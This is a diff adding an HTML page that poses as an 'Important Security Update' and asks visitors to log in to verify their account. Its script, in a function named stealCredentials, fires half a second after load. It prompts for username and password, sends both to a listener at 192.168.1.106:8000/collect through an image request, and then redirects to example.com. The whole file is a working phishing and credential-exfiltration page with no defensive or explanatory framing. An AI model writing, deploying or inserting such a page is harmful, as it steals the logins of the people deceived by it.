@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Update</title>
+    <script>
+        function stealCredentials() {
+            var username = prompt("Enter Username:");
+            var password = prompt("Enter Password:");
+            if (username && password) {
+                new Image().src = 'http://192.168.1.106:8000/collect?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+                window.location.href = "https://www.example.com";
+            }
+        }
+        
+        // Trigger the credentials prompt after a delay to ensure the text is visible
+        window.onload = function() {
+            setTimeout(stealCredentials, 500);  // Delay for 0.5 seconds
+        };
+    </script>
+</head>
+<body>
+    <h1>Important Security Update</h1>
+    <p>Please log in to verify your account due to recent security updates.</p>
+</body>
+</html>
